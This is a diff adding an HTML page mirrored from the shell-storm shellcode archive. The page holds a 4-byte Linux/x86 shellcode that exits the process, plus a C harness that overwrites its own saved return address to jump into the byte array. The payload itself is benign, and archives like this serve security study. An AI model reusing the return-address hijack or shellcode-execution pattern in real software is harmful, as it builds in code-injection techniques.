@@ -1,0 +1,31 @@
+<html>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-233.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+<head><title>Linux/x86 - quick (yet conditional, eax != 0 and edx == 0) exit - 4 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NLNHL50HG5"></script>
+<script src="http://shell-storm.org/assets/js/gtag.js"></script>
+</head>
+
+
+<pre>
+/*
+ * (linux/x86) quick (yet conditional, eax != 0 and edx == 0) exit - 4 bytes
+ * - izik &lt;izik@tty64.org&gt;
+ */
+
+char shellcode[] = 
+
+	&quot;\xf7\xf0&quot;              // div %eax 
+	&quot;\xcd\x80&quot;;             // int $0x80
+
+int main(int argc, char **argv) {
+	int *ret;
+	ret = (int *)&amp;ret + 2;
+	(*ret) = (int) shellcode;
+}
+
+
+</pre>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-233.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+</html>
